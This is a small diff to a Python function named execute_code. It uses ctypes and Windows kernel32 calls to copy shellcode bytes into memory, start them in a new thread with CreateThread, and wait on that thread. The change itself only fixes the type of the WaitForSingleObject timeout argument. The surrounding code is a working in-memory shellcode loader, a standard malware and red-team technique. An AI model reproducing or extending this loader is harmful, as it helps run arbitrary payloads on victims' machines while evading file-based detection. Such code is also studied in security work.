@@ -14,4 +14,4 @@ def execute_code():
     ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space), buff, ctypes.c_int(len(scbytes)))
     handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(space),
                                                  ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
-    ctypes.windll.kernel32.WaitForSingleObject(handle, 0xffffffff);
+    ctypes.windll.kernel32.WaitForSingleObject(handle, ctypes.c_uint32(0xffffffff))
